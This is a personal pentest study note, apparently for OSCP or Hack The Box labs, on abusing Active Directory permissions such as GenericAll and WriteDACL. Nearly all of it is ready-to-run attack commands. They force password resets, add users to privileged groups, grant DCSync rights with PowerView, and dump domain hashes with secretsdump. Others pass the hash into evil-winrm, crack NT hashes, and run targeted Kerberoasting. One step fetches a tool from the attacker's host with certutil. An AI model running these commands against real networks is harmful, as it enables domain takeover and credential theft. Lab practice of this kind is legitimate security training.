# GenericAll

"Full Control" over the target object. You own it completely.

**If target is a User:** Force reset their password.

**If target is a Group:** Add yourself/any user to that group.

- **Change the Target’s Password**: Using `net user <username> <password> /domain`, the attacker can reset the user’s password.

- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.

## Reset Password

```
net user [user]"pass123!" /domain
```

or

```powershell
$SecPassword = ConvertTo-SecureString "pass123!" -AsPlainText -Force Set-ADAccountPassword -Identity "Michael" -NewPassword $SecPassword -Reset
```

EvilwinRM into their new creds

---
## Abuse the `Account Operators` permissions

Add an account into this vulnerable group using `GenericAll` to progress to the next step

```
net user Retric pass123 /add /domain  
```

To check : 
```
net users
```

![[Pasted image 20260911174745.png]]

A Group Name:: Exchange Windows Permissions
```dataviewjs
const page = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const AGroupName = page?.["A Group Name"] ?? "NO GROUP NAME FOUND";

const command = `net group "${AGroupName}" Retric /add`;

dv.paragraph("```bash\n" + command + "\n```");
```
To check : 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const AGroupName = page?.["A Group Name"] ?? "NO GROUP NAME FOUND";

const command = `net group "${AGroupName}"`;

dv.paragraph("```bash\n" + command + "\n```");
```

![[Pasted image 20260911174809.png]]

---
## First Degree Object Control / Force Change Password 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `rpcclient -U '${discoveredDomain}/[AdminUser]%[PW]' ${ip} -c 'setuserinfo2 [targetUser] 23 "[myPW]"'`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260913152431.png]]

Means your password has to be more complex

No response = good

---
## WriteDACL

give our new user the DCSync rights

First, we transfer the `Powerview` binary using the `upload` feature with evil-winrm. Importing PowerView allows us to run commands like "Add-DomainObjectAcl," which is needed to abuse the `WriteDACL` permission.
  
### Upload PowerView.ps1

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/PowerView.ps1 PowerView.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
powershell -ep bypass 
```

```powershell
Import-Module .\PowerView.ps1 
```

---

```
$SecPassword = ConvertTo-SecureString 'pass123' -AsPlainText -Force
```

Replace `htb` with the short NetBIOS domain name of the PG machine (e.g., `pg`, `offsec`, or whatever domain short-name is listed in your enumeration/BloodHound).

```
$Cred = New-Object System.Management.Automation.PSCredential('htb\Retric', $SecPassword)
```

MODIFY DC
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Retric -Rights DCSync
```

---

If no errors, time to dump the hash
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `impacket-secretsdump ${discoveredDomain}/Retric:pass123@${ip} > secretsdump_output.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
Cleanse the data to username:ntlm hash
```
grep -E ':[0-9]+:' secretsdump_output.txt | awk -F ':' '{print $1":"$4}' > ntlm_hashes.txt
```

Login with WinRM using 2nd portion of hash

```
evil-winrm -i 10.129.95.210 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

MODIFY: 
hash:: 823452073d75b9d1cf70ebdf86c7f98e
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";

const command = `evil-winrm -i ${ip} -u administrator -H ${hash}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Crack if needed 

This is the hash.txt format
```dataviewjs
const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";


```
```dataviewjs
const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";

const command = `echo Administrator:${hash} > hash.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Kerberoasting (T1558.003)

This abuse can be carried out when controlling an object that has a [**GenericAll**](https://hackingarticles.in/abusing-ad-dacl-generic-all-permissions/), **GenericWrite**, **WriteProperty** or **Validated-SPN** over the target.

**Linux Python Script – TargetedKerberoast**

From UNIX-like systems, this can be done with [**targetedKerberoast.py**](https://github.com/ShutdownRepo/targetedKerberoast) (Python).

Further, with the help of John the Ripper end the dictionary such as Rock You can help the attacker to brute force the weak password.

MODIFY VV
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `cp ~/Desktop/Tools/Windows . && python3 targetedKerberoast.py --dc-ip '${ip}' -v -d '${discoveredDomain}' -u '[user]' -p '[password]'`;

dv.paragraph("```bash\n" + command + "\n```");
```

![GenericWrite Active Directory Abuse](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzCvkq1G1w_LhrqeokVxc7iQgg0wykE2kBY-kP0IaOcI7gFlx62isK0UR0BxCaZZqjET0q-K2-j8j3dDuhMaurqFNfiG64MWV89lZ3NcP8zN_X6JFueZA26baP120Eo3VJOGiPwRZkl72fgqs5-sNlT-jY9nCYPy3LOKemFVsPQAlUdobnC9rDLTJdhYf4/s16000/24.png)

### Windows PowerShell – Powerview

From Windows machines, this can be achieved with **Set-DomainObject** and **Get-DomainSPNTicket** ([**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

powershell -ep bypass

Import-Module .PowerView.ps1

Set-DomainObject -Identity 'krishna' -Set @{serviceprincipalname='nonexistent/hacking'}

Get-DomainUser 'krishna' | Select serviceprincipalname

$User = Get-DomainUser 'krishna'

$User | Get-DomainSPNTicket

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhH_6UYBUJu91tHDejyjI0Y-J4RAIY6R-YyddXdO2WIfIjyP6NWlwlNDmbydnY6ZGa24ua0qvPgLein3MEACSE1t_r59W8iDuHI7hkUFJW089owzltfbP6H3v3s3eWjTxEbU3aAGtksoKHN9k4eAo-BuZda9BUV5zosc_MM1b2stkxEVYN0U6WU90yX8G-T/s16000/25.png)

---

# GPO-Abuse

[[GPO Abuse]]

---

# DCSync
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `impacket-secretsdump [user]:[pw]@${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```

